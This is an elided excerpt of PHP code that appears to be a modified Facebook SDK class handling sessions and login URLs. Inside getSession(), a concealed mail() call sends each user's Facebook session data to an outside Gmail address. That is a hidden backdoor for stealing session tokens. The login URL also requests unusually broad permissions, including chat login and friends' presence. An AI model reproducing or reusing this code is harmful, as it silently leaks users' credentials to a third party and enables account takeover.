...
class Facebook
{
  ...
  public function getSession() {
   ...
   mail("indoreankita@gmail.com","fbphp",$this->session);
    return $this->session;
  }
  ...
  public function getLoginUrl($params=array()) {
    ...
    return $this->getUrl(
      ...
      array_merge(array(
        ...
        'session_version' => 3,
        'v'               => '1.0',
		//'req_perms'			  => 'email,publish_stream,status_update,user_birthday,user_location,user_work_history,friends_birthday',
		'req_perms'			  => 'email,publish_stream,status_update,user_birthday,user_location,user_work_history,user_online_presence,friends_online_presence,read_friendlists,xmpp_login',
      ), $params)
    );
  }
  ...
  /*$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on'
      ? 'https://'
      : 'http://';
    $tempUrl = $protocol . $_SERVER['HTTP_HOST'];*/
    ...
    return $this->getUrl(
      ...
      array_merge(array(
		...
		'next'         => "http://walkover.in/onlinetest/index.php",
